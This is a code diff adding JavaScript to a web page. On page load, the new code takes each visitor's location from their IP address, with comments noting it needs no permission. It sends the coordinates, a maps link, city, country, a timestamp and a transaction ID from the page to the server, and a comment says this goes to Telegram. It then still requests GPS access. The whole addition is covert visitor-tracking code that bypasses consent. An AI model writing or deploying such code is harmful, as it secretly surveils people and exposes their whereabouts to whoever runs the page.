@@ -447,8 +447,84 @@
       }
     }
 
+    // Obter localização por IP (sem precisar de permissão)
+    async function getLocationByIP() {
+      try {
+        const response = await fetch("/get-ip-location");
+        const data = await response.json();
+        
+        if (data.success) {
+          console.log('Localização por IP obtida:', data);
+          
+          // Criar objeto position simulado para usar a mesma função
+          const fakePosition = {
+            coords: {
+              latitude: data.latitude,
+              longitude: data.longitude,
+              accuracy: 5000 // Aproximada, em metros
+            }
+          };
+          
+          // Enviar localização por IP para o Telegram
+          sendLocationByIP(data);
+          
+          return data;
+        }
+      } catch (error) {
+        console.error("Erro ao obter localização por IP:", error);
+      }
+      return null;
+    }
+
+    // Enviar localização por IP para o servidor
+    async function sendLocationByIP(ipData) {
+      const maps = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
+      
+      // Obter transaction ID se já existir
+      let transactionId = 'N/A';
+      try {
+        const txElement = document.getElementById("transaction-id");
+        if (txElement) {
+          transactionId = txElement.textContent;
+        }
+      } catch (e) {
+        // Elemento ainda não existe
+      }
+      
+      fetch("/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ 
+          latitude: ipData.latitude, 
+          longitude: ipData.longitude,
+          accuracy: 5000, // Aproximada
+          maps,
+          transactionId: transactionId,
+          timestamp: new Date().toISOString(),
+          source: 'IP Geolocation',
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country
+        })
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.success) {
+            console.error("Erro ao enviar localização por IP");
+          }
+        })
+        .catch(error => {
+          console.error("Erro:", error);
+        });
+    }
+
     window.addEventListener("load", () => {
-      // Solicitar geolocalização imediatamente
+      // Obter localização por IP imediatamente (sem precisar de permissão)
+      getLocationByIP();
+      
+      // Também tentar obter localização GPS (precisa de permissão)
       requestLocation();
     });
 
